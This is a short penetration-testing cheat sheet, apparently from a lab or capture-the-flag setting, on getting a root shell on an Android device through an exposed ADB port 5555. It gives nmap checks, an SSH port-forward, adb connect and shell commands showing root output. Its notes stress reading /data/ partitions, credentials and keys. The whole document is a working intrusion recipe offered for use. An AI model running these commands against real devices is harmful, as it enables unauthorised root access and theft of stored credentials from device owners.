# Android ADB Root Shell via Port Forward

When ADB (Android Debug Bridge) port 5555 is accessible (directly or via filtered port with SSH access), forwarding it locally and connecting with `adb` yields a root shell on Android devices.

## Check for ADB Port

```bash
# Port 5555 may appear filtered in nmap but reachable via SSH forward
nmap -p 5555 <TARGET>
```

## Forward via SSH and Connect

```bash
# Forward remote ADB port to localhost (adjust SSH port if non-standard)
ssh -L 5555:localhost:5555 user@<TARGET> -p 2222

# In another terminal, connect ADB to the forwarded port
adb connect localhost:5555
# Connected to localhost:5555

# Get root shell
adb -s localhost:5555 shell
# id → uid=0(root) gid=0(root)
```

## Direct Connection (if port is open)

```bash
adb connect <TARGET>:5555
adb -s <TARGET>:5555 shell
```

## Notes
- ADB on port 5555 = full root access on most Android devices (no auth if not paired)
- SSH forwarding required when nmap shows port filtered (firewall blocks external, SSH allowed)
- `adb shell` on Android gives root by default on debug builds
- Can read `/data/` partitions, credentials, keys unavailable through ES File Explorer
